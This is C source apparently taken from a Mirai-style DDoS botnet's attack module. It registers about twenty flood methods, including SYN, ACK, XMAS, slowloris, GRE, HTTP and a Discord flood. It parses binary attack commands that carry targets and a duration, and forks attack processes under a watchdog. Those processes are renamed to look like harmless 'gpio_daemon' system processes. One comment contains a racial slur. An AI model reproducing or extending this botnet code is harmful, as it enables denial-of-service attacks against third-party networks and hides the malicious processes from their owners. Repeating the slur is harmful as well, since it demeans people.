#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <stdint.h>
#include <errno.h>
#include <sys/prctl.h>
#include <string.h>
#include <sys/wait.h>

#include "includes.h"
#include "attack.h"
#include "rand.h"
#include "util.h"

uint8_t methods_len = 0;
struct attack_method **methods = NULL;
int attack_ongoing[ATTACK_CONCURRENT_MAX] = {0}; // Define here, no extern

BOOL attack_init(void)
{
    int i;

    add_attack(ATK_VEC_UDP_PLAIN, (ATTACK_FUNC)attack_udp_plain);
    add_attack(ATK_VEC_STOMP, (ATTACK_FUNC)attack_tcp_stomp);
    add_attack(ATK_VEC_TCP, (ATTACK_FUNC)attack_method_tcp);
    add_attack(ATK_VEC_ACK, (ATTACK_FUNC)attack_tcp_ack);
    add_attack(ATK_VEC_SYN, (ATTACK_FUNC)attack_tcp_syn);
    add_attack(ATK_VEC_STDHEX, (ATTACK_FUNC)attack_method_stdhex);
    add_attack(ATK_VEC_NUDP, (ATTACK_FUNC)attack_method_nudp);
    add_attack(ATK_VEC_UDPHEX, (ATTACK_FUNC)attack_method_udphex);
    add_attack(ATK_VEC_XMAS, (ATTACK_FUNC)attack_tcp_xmas);
    add_attack(ATK_VEC_TCPSOCKET, (ATTACK_FUNC)attack_tcp_socket);
    add_attack(ATK_VEC_TCP_SLOWLORIS, (ATTACK_FUNC)attack_tcp_slowloris);
    add_attack(ATK_VEC_TCP_RAPIDSOCKET, (ATTACK_FUNC)attack_tcp_rapidsocket);
    add_attack(ATK_VEC_STOP, (ATTACK_FUNC)attack_stop);
    add_attack(ATK_VEC_DISCORD_FLOOD, (ATTACK_FUNC)attack_discord_flood);
    add_attack(ATK_VEC_XORTCP_FLOOD, (ATTACK_FUNC)attack_method_xortcp);
    add_attack(ATK_VEC_ICMP_FLOOD, (ATTACK_FUNC)attack_method_icmpflood);
    add_attack(ATK_VEC_GREIP, (ATTACK_FUNC)attack_gre_ip);
    add_attack(ATK_VEC_GREETH, (ATTACK_FUNC)attack_gre_eth);
    add_attack(ATK_VEC_HTTP, (ATTACK_FUNC)attack_http);
    add_attack(ATK_VEC_HOME, (ATTACK_FUNC)attack_method_home);

    return TRUE;
}

void attack_kill_all(void)
{
    int i;

    for (i = 0; i < ATTACK_CONCURRENT_MAX; i++)
    {
        if (attack_ongoing[i] != 0)
        {
#ifdef DEBUG
            printf("[attack] Killing attack PID %d in slot %d\n", attack_ongoing[i], i);
#endif
            kill(attack_ongoing[i], SIGKILL);
            attack_ongoing[i] = 0; // Clear slot nigger
        }
    }
}

void sigchld_handler(int sig)
{
    pid_t pid;
    int i;

    while ((pid = waitpid(-1, NULL, WNOHANG)) > 0)
    {
        // Check if the reaped PID is in attack_ongoing
        for (i = 0; i < ATTACK_CONCURRENT_MAX; i++)
        {
            if (attack_ongoing[i] == pid)
            {
                attack_ongoing[i] = 0; // Clear the slot
#ifdef DEBUG
                printf("[attack] Cleared attack slot %d (PID %d)\n", i, pid);
#endif
                break;
            }
        }
    }
}

void attack_parse(char *buf, int len)
{
    int i;
    uint32_t duration;
    ATTACK_VECTOR vector;
    uint8_t targs_len, opts_len;
    struct attack_target *targs = NULL;
    struct attack_option *opts = NULL;

    if (len < sizeof (uint32_t))
        goto cleanup;
    duration = ntohl(*((uint32_t *)buf));
    buf += sizeof (uint32_t);
    len -= sizeof (uint32_t);

    if (len == 0)
        goto cleanup;
    vector = (ATTACK_VECTOR)*buf++;
    len -= sizeof (uint8_t);

    if (len == 0)
        goto cleanup;
    targs_len = (uint8_t)*buf++;
    len -= sizeof (uint8_t);
    if (targs_len == 0)
        goto cleanup;

    if (len < ((sizeof (ipv4_t) + sizeof (uint8_t)) * targs_len))
        goto cleanup;
    targs = calloc(targs_len, sizeof (struct attack_target));
    for (i = 0; i < targs_len; i++)
    {
        targs[i].addr = *((ipv4_t *)buf);
        buf += sizeof (ipv4_t);
        targs[i].netmask = (uint8_t)*buf++;
        len -= (sizeof (ipv4_t) + sizeof (uint8_t));

        targs[i].sock_addr.sin_family = AF_INET;
        targs[i].sock_addr.sin_addr.s_addr = targs[i].addr;
    }

    if (len < sizeof (uint8_t))
        goto cleanup;
    opts_len = (uint8_t)*buf++;
    len -= sizeof (uint8_t);

    if (opts_len > 0)
    {
        opts = calloc(opts_len, sizeof (struct attack_option));
        for (i = 0; i < opts_len; i++)
        {
            uint8_t val_len;

            if (len < sizeof (uint8_t))
                goto cleanup;
            opts[i].key = (uint8_t)*buf++;
            len -= sizeof (uint8_t);

            if (len < sizeof (uint8_t))
                goto cleanup;
            val_len = (uint8_t)*buf++;
            len -= sizeof (uint8_t);

            if (len < val_len)
                goto cleanup;
            opts[i].val = calloc(val_len + 1, sizeof (char));
            util_memcpy(opts[i].val, buf, val_len);
            buf += val_len;
            len -= val_len;
        }
    }

    errno = 0;
    attack_start(duration, vector, targs_len, targs, opts_len, opts);

cleanup:
    if (targs != NULL)
        free(targs);
    if (opts != NULL)
        free_opts(opts, opts_len);
}

void attack_start(int duration, ATTACK_VECTOR vector, uint8_t targs_len,
                 struct attack_target *targs, uint8_t opts_len,
                 struct attack_option *opts)
{
    int i, pid, slot = -1;

    for (i = 0; i < ATTACK_CONCURRENT_MAX; i++)
    {
        if (attack_ongoing[i] == 0)
        {
            slot = i;
            break;
        }
    }
    if (slot == -1)
    {
#ifdef DEBUG
        printf("[attack] No free slots for new attack\n");
#endif
        return; // No free slots
    }

    pid = fork();
    if (pid == -1)
    {
#ifdef DEBUG
        printf("[attack] Fork failed: %s\n", strerror(errno));
#endif
        return;
    }
    if (pid > 0)
    {
        attack_ongoing[slot] = pid;
#ifdef DEBUG
        printf("[attack] Assigned PID %d to slot %d\n", pid, slot);
#endif
        return;
    }

    int pid2 = fork();
    if (pid2 == -1)
    {
#ifdef DEBUG
        printf("[attack] Watchdog fork failed: %s\n", strerror(errno));
#endif
        exit(0);
    }

    if (pid2 == 0)
    {
        prctl(PR_SET_NAME, "gpiol_daemon", 0, 0, 0);
#ifdef DEBUG
        printf("[attack] Watchdog started for PID %d, sleeping for %d seconds\n", getppid(), duration);
#endif
        sleep(duration);
#ifdef DEBUG
        printf("[attack] Watchdog killing parent PID %d\n", getppid());
#endif
        kill(getppid(), SIGKILL);
        exit(0);
    }
    else
    {
        prctl(PR_SET_NAME, "gpio_daemon", 0, 0, 0);
        for (i = 0; i < methods_len; i++)
        {
            if (methods[i]->vector == vector)
            {
                methods[i]->func(targs_len, targs, opts_len, opts);
                break;
            }
        }
        exit(0);
    }
}

char *attack_get_opt_str(uint8_t opts_len, struct attack_option *opts, uint8_t opt, char *def)
{
    int i;

    for (i = 0; i < opts_len; i++)
    {
        if (opts[i].key == opt)
            return opts[i].val;
    }

    return def;
}

int attack_get_opt_int(uint8_t opts_len, struct attack_option *opts, uint8_t opt, int def)
{
    char *val = attack_get_opt_str(opts_len, opts, opt, NULL);

    if (val == NULL)
        return def;
    else
        return util_atoi(val, 10);
}

uint32_t attack_get_opt_ip(uint8_t opts_len, struct attack_option *opts, uint8_t opt, uint32_t def)
{
    char *val = attack_get_opt_str(opts_len, opts, opt, NULL);

    if (val == NULL)
        return def;
    else
        return inet_addr(val);
}

static void add_attack(ATTACK_VECTOR vector, ATTACK_FUNC func)
{
    struct attack_method *method = calloc(1, sizeof (struct attack_method));

    method->vector = vector;
    method->func = func;

    methods = realloc(methods, (methods_len + 1) * sizeof (struct attack_method *));
    methods[methods_len++] = method;
}

static void free_opts(struct attack_option *opts, int len)
{
    int i;

    if (opts == NULL)
        return;

    for (i = 0; i < len; i++)
    {
        if (opts[i].val != NULL)
            free(opts[i].val);
    }
    free(opts);
}

void attack_cleanup_stale_slots(void)
{
    int i;
    for (i = 0; i < ATTACK_CONCURRENT_MAX; i++)
    {
        if (attack_ongoing[i] != 0)
        {
            // Check if the process is still alive
            if (kill(attack_ongoing[i], 0) == -1 && errno == ESRCH)
            {
                // Process doesn't exist, clear the slot
#ifdef DEBUG
                printf("[attack] Cleared stale slot %d (PID %d)\n", i, attack_ongoing[i]);
#endif
                attack_ongoing[i] = 0;
            }
        }
    }
}
